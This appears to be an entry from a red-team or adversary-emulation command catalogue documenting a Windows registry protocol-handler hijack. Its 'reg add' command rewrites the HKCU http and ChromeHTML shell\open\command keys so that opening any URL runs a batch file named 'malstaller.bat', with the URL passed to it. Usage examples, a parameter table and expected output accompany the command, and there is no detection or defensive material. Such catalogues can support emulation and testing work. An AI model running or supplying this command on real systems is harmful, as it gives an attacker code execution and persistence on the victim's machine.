---
id: f6g7h8i9-j0k1-2345-fghi-678901234567
data: >-
  reg add "HKCU\Software\Classes\http\shell\open\command" /ve /d
  "C:\Users\Temp\Desktop\malstaller.bat \"%1\"" /f
tags:
  - registry
  - hijack
type: command
output: The operation completed successfully.
executor: cmd
platforms:
  - Windows
created_at: '2023-10-01T12:00:00Z'
updated_at: '2025-12-14T17:29:44.565Z'
verified: false
validated: true
submitted: true
---
# set-registry-protocol-hijack

## Command

```cmd
reg add "HKCU\Software\Classes\http\shell\open\command" /ve /d "C:\Users\Temp\Desktop\malstaller.bat \"%1\"" /f
```

## Description

Modifies the HKCU registry key for a protocol handler (e.g., http) to point the default command to a malicious batch script, hijacking URL opens to execute the payload with the URL as %1 parameter.

## Parameters

| Parameter | Description | Required |
|-----------|-------------|----------|
| /ve | Sets the default (unnamed) value | Yes |
| /d | Data value (path to script with %1) | Yes |
| /f | Force without prompt | Yes |
| Key path | Specific protocol key (e.g., HKCU\...\http\...) | Yes |

## Examples

### Basic Usage

```cmd
reg add "HKCU\Software\Classes\http\shell\open\command" /ve /d "C:\Users\Temp\Desktop\malstaller.bat \"%1\"" /f
```

### Advanced Usage

```cmd
reg add "HKCU\Software\Classes\ChromeHTML\shell\open\command" /ve /d "C:\Users\Temp\Desktop\malstaller.bat \"%1\"" /f
```

## Expected Output

The operation completed successfully. No errors if key is writable.

## Related

- [[procedures/Tamper-HKCU-Registry-Keys-for-Protocol-Hijacking]]
- [[reg query verify-hijack]]
